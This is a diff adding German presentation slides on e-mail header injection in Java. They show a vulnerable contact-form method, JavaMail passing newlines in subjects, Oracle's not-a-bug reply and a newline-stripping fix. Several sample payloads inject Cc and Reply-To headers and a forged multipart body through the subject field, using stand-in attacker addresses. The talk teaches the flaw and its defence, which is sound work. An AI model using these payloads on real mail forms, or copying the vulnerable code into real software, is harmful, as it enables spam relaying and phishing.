@@ -1,0 +1,127 @@
+Title:  E-Mail Header Injection
+
+Author: Steve Ulrich, Micromata GmbH
+
+
+Just Another Injection
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Title: Die Inspiration
+
+.---------------------------
+| public void sendContactForm(String subject, String content) {
+|   String template = 
+|     "From: "+user.getEmail()+"\n"+
+|     "To: "+contactEmail +"\n"+
+|     "Subject: "+subject+"\n"+
+|     "\n"+
+|     content; 
+|   sendEmail(template);
+| }
+`---------------------------
+
+Title: Das Problem
+
+.---------------------------
+| http://xxx/sendContactForm
+|   ?subject=sometext%0ACc%3A+evil%40example.com
+|   &text=sometext
+`---------------------------
+
+Title: Das Resultat
+
+.---------------------------
+| From: user@example.com
+| To: contact@example.com
+| Subject: sometext
+| Cc: evil@example.com
+| 
+| sometext
+`---------------------------
+
+
+Title: Also nur eine Injection Lücke?
+
+Nutzen wir also eine API (JavaMail), die wird uns schon schützen!
+                                                  Letzte Worte eines Entwicklers
+
+
+Title: JavaMail to the R...
+
+
+.---------------------------
+|   String subject = "sometext\nevil@example.com";
+| 
+|   final MimeMessage msg = ..
+|   msg.setSender(new InternetAddress(user.getEmail()));
+|   msg.setRecipient(RecipientType.TO, new InternetAddress(contactEmail));
+|   msg.setSubject(subject);
+|   msg.setText("BlahBlah");
+`---------------------------
+
+Title: JavaMail to the R...WTF
+
+
+.---------------------------
+| From: user@example.com
+| To: contact@example.com
+| Subject: sometext
+| Cc: evil@example.com
+| 
+| BlahBlah
+`---------------------------
+
+Title: Ein Bug?
+
+Es exitiert ein Issue: CSNC-2014-001
+
+.---------------------------
+| The assessment from our engineering team is that this is not a bug in JavaMail
+| API. The application is responsible to perform some input validation. In this
+| particular case, the application is responsible for ensuring that the subject
+| string does not contain any line breaks. The code demonstrated the issue is not
+| an Oracle sample. Therefore, we are closing the issue as not-a-bug.
+`---------------------------
+                                                                          Oracle
+
+Title: Validierung
+
+Eine Grundregel bei Input Validation ist "Versuche es nicht selbst".
+
+                           Keine Regel ohne Ausnahme
+.---------------------------
+| subject.replaceAll("[\\n\\r]+", " ");
+`---------------------------
+
+Title: Spaß mit Header Injection
+
+.---------------------------
+| String subject = "Test" // This will be the subject                
+|   + "\n"
+|   + "\nEvil content"
+`---------------------------
+.---------------------------
+| From: user@example.com
+| To: contact@example.com
+| Subject: sometext
+| 
+| Evil Content
+| 
+| BlahBlah
+`---------------------------
+
+Title: Multipart injection
+
+.---------------------------
+| String subject = "Cheap Viagra"
+|   + "\nReply-To:attacker@example.com" // Man bittet um Antwort
+|   + "\nMIME-Version: 1.0" // Content-Header
+|   + "\nContent-Type: multipart/mixed; boundary=frontier"
+|   + "\n" // Empty line separates the Content!
+|   + "\n--frontier" 
+|   + "\nContent-Type: text/plain\n" // Oder Fancy HTML?
+|   + "\nBilliges Viagra" // So günstig
+|   + "\n--frontier" 
+|   + "\nContent-Type: text/nonsense" // jetzt den alten Content raus
+|   + "\n" // Empty line separates the Content!
+`---------------------------
